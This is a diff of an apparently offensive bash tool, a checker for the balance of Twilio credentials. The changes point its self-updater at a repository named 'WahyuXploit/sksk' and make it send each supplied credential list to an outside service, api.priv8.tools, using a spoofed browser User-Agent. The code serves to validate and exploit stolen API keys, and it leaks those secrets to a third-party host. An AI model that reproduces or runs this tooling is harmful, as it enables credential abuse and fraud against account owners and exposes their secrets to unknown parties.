@@ -19,10 +19,10 @@ labelkuning='\e[43m'
 updater() {
 	echo "Checking integrity file to server..."
 	localShellCode=`cat $0 | sha256sum`
-	cloudShellCode=`curl "https://raw.githubusercontent.com/nako48/Gabut-Project/master/haruka.sh" -s | sha256sum`
+	cloudShellCode=`curl "https://raw.githubusercontent.com/WahyuXploit/sksk/main/checker.sh" -s | sha256sum`
 	if [[ $localShellCode != $cloudShellCode ]]; then
 		echo "Updating script... Please wait."
-		wget "https://raw.githubusercontent.com/nako48/Gabut-Project/master/haruka.sh"
+		wget "https://raw.githubusercontent.com/WahyuXploit/sksk/main/checker.sh"
 		echo "File successfully updated on `date`."
 	else
 		echo "Script are up to date"
@@ -37,7 +37,7 @@ updater
 esac
 done
 TwilliocURL(){
-	gET=$(curl -skL --connect-timeout 15 --max-time 15 "api.priv8.tools/twilio_balance/api.php?list=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
+	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://api.priv8.tools/twilio_balance/api.php?list=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
 }
 TwilioREsulT(){
 	TwilliocURL $1
